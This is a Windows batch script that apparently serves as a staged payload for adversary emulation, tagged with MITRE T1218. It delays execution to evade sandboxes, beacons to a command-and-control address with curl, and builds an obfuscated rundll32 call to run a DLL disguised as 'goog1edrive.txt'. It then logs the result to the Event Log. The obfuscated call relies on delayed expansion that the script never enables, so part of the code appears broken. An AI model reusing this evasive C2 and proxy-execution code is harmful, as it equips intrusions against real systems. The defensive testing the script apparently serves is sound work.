@echo off

REM Random constant names with PHR_ as values
SET wqrvxq=%APPDATA%\8279\a2b0ab7d
SET kzfpgy=Macula-Stage0-8279
SET nljdcj=https://10.0.0.49
SET xvcqzl=https://10.0.0.49/stage/2/icon.png?8279-7
SET dnfpve=BALAM-S2BO
SET hbrkks=7
SET gvmnzz=goog1edrive.txt
SET rqhzmc=8279

REM Initial delay to evade sandbox analysis
timeout /t 50 /nobreak >nul

REM Heartbeat to C2 - FIRST OPERATION AS REQUESTED
curl -k -s -o nul "%xvcqzl%"

ping -n 7 127.0.0.1 >nul

REM Change to output directory
cd /d "%wqrvxq%" 2>nul

CHOICE /C Y /N /D Y /T 4 >nul

REM Build heavily obfuscated rundll32 command for T1218 using escape fragmentation
SET l1=r^u
SET l2=n^d
SET l3=l^l
SET l4=3^2
SET l5=^.^e
SET l6=x^e
SET l0l=%WINDIR%\System32\!l1!!l2!!l3!!l4!!l5!!l6!

REM Fragment DLL call arguments
SET a1=g^v^m^n^z^z
SET a2=D^l^l^M^a^i^n

REM Execute obfuscated LOLBin
SET /A rndout=%RANDOM% %% 1000
FOR /F "tokens=*" %%A IN ('echo !l0l! "%%!a1!%%,!a2!"') DO (
    %%A 2>nul
)

REM Random delay
SET /A delay=%RANDOM% %% 18 + 12
timeout /t %delay% /nobreak >nul

ping -n 3 127.0.0.1 >nul

REM TTP logging via Windows Event Log only (no file writes)
SET result=1
SET err_detail=
eventcreate /L INFORMATION /SO MaculaCTEM /T SUCCESS /ID %rndout% /D "%dnfpve%: %hbrkks%-%rqhzmc%-T1218|Signed Binary Proxy Execution=%result%:%err_detail%" >nul 2>nul

REM Final delay
CHOICE /C Y /N /D Y /T 2 >nul